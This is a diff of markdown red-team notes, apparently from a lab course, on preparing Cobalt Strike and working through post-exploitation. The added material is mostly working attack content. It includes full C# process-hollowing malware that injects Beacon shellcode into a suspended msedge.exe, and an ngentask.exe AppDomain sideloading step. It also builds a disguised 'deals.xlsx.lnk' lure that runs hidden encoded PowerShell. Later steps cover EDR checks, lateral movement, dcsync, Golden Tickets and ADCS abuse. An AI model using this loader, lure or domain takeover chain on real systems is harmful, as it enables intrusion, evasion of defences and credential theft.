@@ -1,4 +1,4 @@
-# Cobalt Strike Prepare  
+# Cobalt Strike Prepare & Beyond  
 
 The objective is to setup Cobalt Strike.  Update Malleable C2 profile, create artifact, resource kit, listeners, load scripts, and disable AppLocker controls for first Beacon.  
 
@@ -10,9 +10,16 @@ The objective is to setup Cobalt Strike.  Update Malleable C2 profile, create ar
 * Load CNA CS Script Manager
 * Generate & Host Payloads
 * AppLocker Bypass Initial access
+* Initial Beacon
 * Connected Beacon Checklist
-* Local Workstation Enumeration
-* Test beacon callback with Defender ON 🛡️  
+* Methodology Gates
+  * Post Exploitation Enumeration
+  * Local Privilege Escalation
+  * Initial Persistence
+  * Active Directory Recon Discovery
+  * Credential Attacks
+  * Lateral Movement
+  * Domain Dominance  
 
 ### SSH to team server
 
@@ -293,6 +300,311 @@ Site Management > Host File
 http://172.16.0.10:80/beacon.dll
 ```
 
+## Generate RAW BIN Beacon shellcode
+
+```
+Cobalt Strike >Payloads > Windows Stageless Payload
+Listener: http
+Output: Raw
+Click Generate.
+Save to C:\Payloads\http_x64.xprocess.bin
+```
+
+### Build the AppDomainHijack DLL
+
+>Visual Studio > create > `Class Library (.NET Framework)` and Add the shellcode to the project.
+> Add > Existing Item > `C:\Payloads\http_x64.xprocess.bin` and Properties > Set Build Action > `Embedded Resource`  
+
+>Process Hollowing Malware `Class1.cs`:  
+
+```cpp
+using System;
+using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
+ 
+namespace AppDomainHijack
+{
+    public sealed class DomainManager : AppDomainManager
+    {
+        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
+        {
+            var si = new STARTUPINFOA
+            {
+                cb = (uint)Marshal.SizeOf<STARTUPINFOA>(),
+                dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
+            };
+ 
+            // create hidden + suspended msedge process
+            var success = CreateProcessA(
+                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+                "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window",
+                IntPtr.Zero,
+                IntPtr.Zero,
+                false,
+                PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
+                IntPtr.Zero,
+                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\",
+                ref si,
+                out var pi);
+ 
+            if (!success)
+                return;
+ 
+            // get basic process information
+            var szPbi = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
+            var lpPbi = Marshal.AllocHGlobal(szPbi);
+ 
+            NtQueryInformationProcess(
+                pi.hProcess,
+                PROCESSINFOCLASS.ProcessBasicInformation,
+                lpPbi,
+                (uint)szPbi,
+                out _);
+ 
+            // marshal data to structure
+            var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(lpPbi);
+            Marshal.FreeHGlobal(lpPbi);
+ 
+            // calculate pointer to image base address
+            var lpImageBaseAddress = pbi.PebBaseAddress + 0x10;
+ 
+            // buffer to hold data, 64-bit addresses are 8 bytes
+            var bImageBaseAddress = new byte[8];
+ 
+            // read data from spawned process
+            ReadProcessMemory(
+                pi.hProcess,
+                lpImageBaseAddress,
+                bImageBaseAddress,
+                8,
+                out _);
+ 
+            // convert address bytes to pointer
+            var baseAddress = (IntPtr)BitConverter.ToInt64(bImageBaseAddress, 0);
+ 
+            // read pe headers
+            var data = new byte[512];
+ 
+            ReadProcessMemory(
+                pi.hProcess,
+                baseAddress,
+                data,
+                512,
+                out _);
+ 
+            // read e_lfanew
+            var e_lfanew = BitConverter.ToInt32(data, 0x3C);
+ 
+            // calculate rva
+            var rvaOffset = e_lfanew + 0x28;
+            var rva = BitConverter.ToUInt32(data, rvaOffset);
+ 
+            // calculate address of entry point
+            var lpEntryPoint = (IntPtr)((UInt64)baseAddress + rva);
+ 
+            // read the shellcode
+            byte[] shellcode;
+ 
+            var assembly = Assembly.GetExecutingAssembly();
+ 
+            using (var rs = assembly.GetManifestResourceStream("AppDomainHijack.http_x64.xprocess.bin"))
+            {
+                // convert stream to raw byte[]
+                using (var ms = new MemoryStream())
+                {
+                    rs.CopyTo(ms);
+                    shellcode = ms.ToArray();
+                }
+            }
+ 
+            // copy shellcode into address of entry point
+            WriteProcessMemory(
+                pi.hProcess,
+                lpEntryPoint,
+                shellcode,
+                shellcode.Length,
+                out _);
+ 
+            // resume process
+            ResumeThread(pi.hThread);
+        }
+ 
+        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        private static extern bool CreateProcessA(
+            string applicationName,
+            string commandLine,
+            IntPtr processAttributes,
+            IntPtr threadAttributes,
+            bool inheritHandles,
+            PROCESS_CREATION_FLAGS creationFlags,
+            IntPtr environment,
+            string currentDirectory,
+            ref STARTUPINFOA startupInfo,
+            out PROCESS_INFORMATION processInformation);
+ 
+        [DllImport("ntdll.dll", ExactSpelling = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        private static extern uint NtQueryInformationProcess(
+            IntPtr processHandle,
+            PROCESSINFOCLASS processInformationClass,
+            IntPtr processInformation,
+            uint processInformationLength,
+            out uint returnLength);
+ 
+        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        private static extern bool ReadProcessMemory(
+            IntPtr processHandle,
+            IntPtr baseAddress,
+            byte[] buffer,
+            UInt64 size,
+            out uint numberOfBytesRead);
+ 
+        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        private static extern bool WriteProcessMemory(
+            IntPtr processHandle,
+            IntPtr baseAddress,
+            byte[] buffer,
+            int size,
+            out int numberOfBytesWritten);
+ 
+        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        private static extern uint ResumeThread(IntPtr threadHandle);
+    }
+ 
+    [Flags]
+    public enum PROCESS_CREATION_FLAGS : uint
+    {
+        DEBUG_PROCESS = 0x00000001,
+        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+        CREATE_SUSPENDED = 0x00000004,
+        DETACHED_PROCESS = 0x00000008,
+        CREATE_NEW_CONSOLE = 0x00000010,
+        NORMAL_PRIORITY_CLASS = 0x00000020,
+        IDLE_PRIORITY_CLASS = 0x00000040,
+        HIGH_PRIORITY_CLASS = 0x00000080,
+        REALTIME_PRIORITY_CLASS = 0x00000100,
+        CREATE_NEW_PROCESS_GROUP = 0x00000200,
+        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+        CREATE_SEPARATE_WOW_VDM = 0x00000800,
+        CREATE_SHARED_WOW_VDM = 0x00001000,
+        CREATE_FORCEDOS = 0x00002000,
+        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
+        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
+        INHERIT_PARENT_AFFINITY = 0x00010000,
+        INHERIT_CALLER_PRIORITY = 0x00020000,
+        CREATE_PROTECTED_PROCESS = 0x00040000,
+        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
+        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
+        PROCESS_MODE_BACKGROUND_END = 0x00200000,
+        CREATE_SECURE_PROCESS = 0x00400000,
+        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+        CREATE_NO_WINDOW = 0x08000000,
+        PROFILE_USER = 0x10000000,
+        PROFILE_KERNEL = 0x20000000,
+        PROFILE_SERVER = 0x40000000,
+        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
+    }
+ 
+    public struct STARTUPINFOA
+    {
+        public uint cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public uint dwX;
+        public uint dwY;
+        public uint dwXSize;
+        public uint dwYSize;
+        public uint dwXCountChars;
+        public uint dwYCountChars;
+        public uint dwFillAttribute;
+        public STARTUPINFO_FLAGS dwFlags;
+        public ushort wShowWindow;
+        public ushort cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+ 
+    [Flags]
+    public enum STARTUPINFO_FLAGS : uint
+    {
+        STARTF_FORCEONFEEDBACK = 0x00000040,
+        STARTF_FORCEOFFFEEDBACK = 0x00000080,
+        STARTF_PREVENTPINNING = 0x00002000,
+        STARTF_RUNFULLSCREEN = 0x00000020,
+        STARTF_TITLEISAPPID = 0x00001000,
+        STARTF_TITLEISLINKNAME = 0x00000800,
+        STARTF_UNTRUSTEDSOURCE = 0x00008000,
+        STARTF_USECOUNTCHARS = 0x00000008,
+        STARTF_USEFILLATTRIBUTE = 0x00000010,
+        STARTF_USEHOTKEY = 0x00000200,
+        STARTF_USEPOSITION = 0x00000004,
+        STARTF_USESHOWWINDOW = 0x00000001,
+        STARTF_USESIZE = 0x00000002,
+        STARTF_USESTDHANDLES = 0x00000100
+    }
+ 
+    public struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public uint dwProcessId;
+        public uint dwThreadId;
+    }
+ 
+    public enum PROCESSINFOCLASS
+    {
+        ProcessBasicInformation = 0
+    }
+ 
+    public struct PROCESS_BASIC_INFORMATION
+    {
+        public uint ExitStatus;
+        public IntPtr PebBaseAddress;
+        public ulong AffinityMask;
+        public int BasePriority;
+        public ulong UniqueProcessId;
+        public ulong InheritedFromUniqueProcessId;
+    }
+}
+```
+
+>DLL sideloading with ngentask.exe, and creating a shortcut link:  
+
+```
+cd C:\Payloads\deals
+cp C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll C:\Payloads\deals\
+cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Payloads\deals\
+
+$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
+$env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
+
+.\ngentask.exe
+
+cd C:\Payloads\deals\
+$cmd = '$env:APPDOMAIN_MANAGER_TYPE = "AppDomainHijack.DomainManager"; $env:APPDOMAIN_MANAGER_ASM = "AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"; .\ngentask.exe'
+$enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
+
+$wsh = New-Object -ComObject WScript.Shell
+$lnk = $wsh.CreateShortcut("C:\Payloads\deals\deals.xlsx.lnk")
+$lnk.TargetPath = "%COMSPEC%"
+$lnk.Arguments = "/C start deals.xlsx && %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -enc $enc"
+$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
+$lnk.Save()
+```
+
+>[deals.xlsx.lnk](deals.xlsx.lnk)  
+
+
 # AppLocker Bypass
 
 >Initial Access, Provided credentials, Locally logged onto compromised workstation  
@@ -349,55 +661,80 @@ rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
 ```cs
 sleep 3 20                                      // reduce check-in noise
 ps                                              // get process list
-process_browser
+process_browser                                 // Microsoft Defender/CrowdStrike/SentinelOne/Carbon Black processes → 🔴UNSAFE
+ls / pwd / drives                               // file system context
 ppid <explorer.exe or svchost.exe PID>          // spoof parent — see note below
 spawnto x64 %windir%\sysnative\werfault.exe     // override default rundll32
 getuid                                          // confirm user context
+netstat                                         // other network connections 
 ```
 
-# Methodology Phases  
+----  
 
->Loop through phases:
-* enumeration
-* post exploit
-* persistence
-* enumerate more
-* privilege escalate
-* elevated persistence
-* enumerated domain users, computers, groups
-* privlege escalate in domain
-* ADCS and SQL enumeration
-* trusts enumeration
-* pivot and tunneling
+# Methodology Gates💡
 
-## Initial Persistence
-
->On initial compromised workstation obtain persistence
->[Initial Persistence on first beacon](/labs/Persistence-lab.md)  
-
-## Post Exploitation Enumeration  
+## Post Exploitation Enumeration 🔍 
 
 >[Post Exploitation Checks](/cheatsheets/post-exploitation.md)  
 
 >commands to execute on workstation
 >find other users, local privilege escalation, local workstation persistence, before moving to domain enumeration.  
 
-## Privilege Escalation  
+## Local Privilege Escalation 🔥 
 
->[Privilege Escalation via weak service registry permissions to SYSTEM Beacon](/labs/Privilege-Escalation-lab.md)  
+>[Privilege Escalation via WMI subscription or weak service registry permissions to SYSTEM Beacon](/labs/Privilege-Escalation-lab.md)  
+* Weak service registry (powerpick — 🟢SAFE, no spawn)  
+* steal_token from an existing SYSTEM process (🟢SAFE)  
 
-## AD Discovery  
+## Initial Persistence 🗝️
+
+>Once SYSTEM → get elevated SYSTEM persistence  
+>On initial compromised workstation obtain persistence
+>[Initial Persistence on first beacon](/labs/Persistence-lab.md)  
+
+## Active Directory Recon Discovery 🕵️ 
 
 >[Active Directory Discovery and Enumeration](/labs/Discovery-lab.md)  
->Enumerate domain users, computers, groups, objects — OPSEC-🟢SAFE  
-> ⚠️ ldapsearch also requires a valid Kerberos token — see note in Discovery lab.  
 
-```cs
-ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes name,samaccountname,memberof,admincount,servicePrincipalName,dNSHostName,operatingSystem
+1. ldapsearch — users, computers, groups, SPNs, AdminCount=1 objects
+2. ldapsearch — trust objects (find the forest map early)
+3. ldapsearch — ADCS (pKIEnrollmentService objects)
+4. Import logs into BloodHound via BOFHound
+5. Import logs to BloodHound - graph - Identify shortest Domain Admin paths
+  
+## Credential Attacks 🧨
+
+* kerberoast
+* AS-REP roast
+* krb_triage + krb_dump
+* steal_token
+
+## Lateral Movement ⚔️
+
+1. steal_token <pid of target user>  →  jump winrm64 <target> smb       (🟢SAFE)
+2. make_token DOMAIN\user Pass       →  jump winrm64 <target> smb       (🟠CAUTION)
+3. make_token / steal_token          →  jump scshell64 <target> smb     (🟠CAUTION)
+4. remote-exec wmi (if WinRM closed) →  needs payload pre-staged on target (🟠CAUTION)
+5. jump psexec64 — LAST RESORT ONLY, flag the OPSEC cost in your notes  (🔴UNSAFE)  
+
+## Domain Dominance 🎯
+
+>When SYSTEM or Admin obtained, then:
+         
+```
+dcsync contoso.com CONTOSO\krbtgt → krbtgt hash → Golden Ticket
 ```
 
->Domain Trust enumeration  
+```
+ADCS — ESC1/ESC8):
+Enroll → get PFX → Rubeus asktgt /certificate: → inject TGT
+```
 
-```bash
-ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes
+```cross-forest
+Trust key via dcsync → inter-realm TGT → access child/parent domains
+```
+
+```
+dcsync CONTOSO\Administrator → for flags and persistence
+Rubeus golden → kerberos_ticket_use → persistent DA access without re-exploiting
 ```
